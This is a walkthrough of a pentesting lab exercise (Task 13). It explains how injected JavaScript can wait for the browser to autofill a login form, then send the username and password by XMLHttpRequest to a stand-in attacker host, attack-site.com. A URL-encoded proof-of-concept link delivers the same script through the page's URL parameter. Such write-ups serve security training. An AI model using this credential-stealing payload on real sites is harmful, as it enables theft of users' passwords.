## Task 13 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/13)</small>

Objectives:

1. Enter a Username/Password and allow the browser to remember it
2. Reload the page so the auto-complete now adds the Username/Password automatically
3. Write JS attack code which waits for 10 seconds, then submits the form automatically to your Attack server using an XMLHttpRequest() call

This is similar to [TASK_12](https://github.com/tbhaxor/pt-jsfp/blob/main/TASK_12.md), just the change is in the delivery. Earlier it was submitting the form, this time we have to send a XHR request.

Well, XHR are the way by which you can send HTTP requests programatically using JS.

To accomplish this task, we have to use [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) and the setTimeout function which will call it after 10 seconds

```js
document.forms[0].autocomplete = "on";
setTimeout(() => {
  var xhttp = new XMLHttpRequest();
  const e = document.querySelector("input[type='text']");
  const p = document.querySelector("input[type='password']");
  xhttp.open("GET", "http://attack-site.com?e=" + e.value + "&p=" + p.value, true);
  xhttp.send();
}, 10000);
```

To check if the request has been made to the endpoint or not, you can see all the requests in [Network Tab](https://developers.google.com/web/tools/chrome-devtools/network)

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/13?url=%3Cscript%3Edocument.forms%5B0%5D.autocomplete%20%3D%20%22on%22%3B%0AsetTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20var%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20const%20e%20%3D%20document.querySelector%28%22input%5Btype%3D%27text%27%5D%22%29%3B%0A%20%20const%20p%20%3D%20document.querySelector%28%22input%5Btype%3D%27password%27%5D%22%29%3B%0A%20%20xhttp.open%28%22GET%22%2C%20%22http%3A%2F%2Fattack-site.com%3Fe%3D%22%20%2B%20e.value%20%2B%20%22%26p%3D%22%20%2B%20p.value%2C%20true%29%3B%0A%20%20xhttp.send%28%29%3B%0A%7D%2C%2010000%29%3B%0A%3C%2Fscript%3E)

**More Resources**

1. [Get Started with XHR](https://www.w3schools.com/xml/xml_http.asp)
